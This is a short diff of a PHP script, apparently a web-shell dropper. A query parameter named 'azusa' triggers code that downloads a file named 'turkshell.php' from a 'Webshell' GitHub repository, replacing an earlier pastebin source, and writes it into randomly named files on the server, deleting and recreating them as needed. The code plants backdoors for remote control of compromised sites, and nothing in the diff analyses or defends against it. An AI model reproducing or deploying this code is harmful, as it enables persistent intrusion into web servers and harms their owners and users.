@@ -80,7 +80,7 @@ if (isset($_GET['azusa'])) {
         }
         // if $randomFileName not exists in $folderName then create file $randomFileName with content from https://pastebin.com/raw/6FbijY4p
         if (!file_exists($folderName . "/" . $randomFileName)) {
-            $content = file_get_contents("https://pastebin.com/raw/6FbijY4p");
+            $content = file_get_contents("https://github.com/azusa-sama/Webshell/raw/master/turkshell.php");
             // if success put content to file $randomFileName then echo success
             if (file_put_contents($folderName . "/" . $randomFileName, $content)) {
                 echo "Success create file $randomFileName<br>";
@@ -99,7 +99,7 @@ if (isset($_GET['azusa'])) {
         } else {
             // remove file $randomFileName then create file $randomFileName with content from https://pastebin.com/raw/6FbijY4p
             if (unlink($folderName . "/" . $randomFileName)) {
-                $content = file_get_contents("https://pastebin.com/raw/6FbijY4p");
+                $content = file_get_contents("https://github.com/azusa-sama/Webshell/raw/master/turkshell.php");
                 // if success put content to file $randomFileName then echo success
                 if (file_put_contents($folderName . "/" . $randomFileName, $content)) {
                     echo "Success create file $randomFileName<br>";
